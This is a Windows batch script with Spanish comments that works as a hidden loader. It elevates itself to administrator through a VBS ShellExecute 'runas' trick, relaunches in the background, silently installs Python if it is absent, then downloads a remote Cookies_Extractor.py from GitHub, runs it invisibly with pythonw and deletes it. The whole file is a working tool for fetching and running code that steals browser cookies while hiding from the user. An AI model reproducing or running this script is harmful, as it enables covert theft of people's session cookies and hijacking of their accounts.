@echo off
:: Auto-elevación invisible a admin
fltmc >nul 2>&1 || (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\elevate.vbs"
    echo UAC.ShellExecute "%~f0", "", "", "runas", 0 >> "%temp%\elevate.vbs"
    "%temp%\elevate.vbs" >nul 2>&1
    del "%temp%\elevate.vbs" >nul 2>&1
    exit
)

:: Ejecución en segundo plano
if not defined INVISIBLE_MODE (
    set INVISIBLE_MODE=1
    start "" /B "%~f0" %*
    exit
)

:: --------------------------------------------
:: CÓDIGO PRINCIPAL (Totalmente oculto)
:: --------------------------------------------

:: 1. Verificar/Instalar Python
where python >nul 2>&1 || (
    bitsadmin /transfer pythonDownload /download /priority foreground "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe" "%TEMP%\python_install.exe" >nul 2>&1
    start /wait "" "%TEMP%\python_install.exe" /quiet InstallAllUsers=1 PrependPath=1 Include_test=0 Include_launcher=0 >nul 2>&1
    del "%TEMP%\python_install.exe" >nul 2>&1
)

:: 2. Descargar y ejecutar script de GitHub
set "SCRIPT_URL=https://raw.githubusercontent.com/GrpDsG20/Cookies_Extractor/main/Cookies_Extractor.py"
set "SCRIPT_PATH=%TEMP%\Cookies_Extractor.py"

:: Descargar usando PowerShell (método más confiable)
powershell -Command "(New-Object Net.WebClient).DownloadFile('%SCRIPT_URL%', '%SCRIPT_PATH%')" >nul 2>&1

:: Ejecutar
pythonw "%SCRIPT_PATH%" >nul 2>&1

:: Limpieza (opcional)
del "%SCRIPT_PATH%" >nul 2>&1

:: --------------------------------------------
:: FIN DEL CÓDIGO
:: --------------------------------------------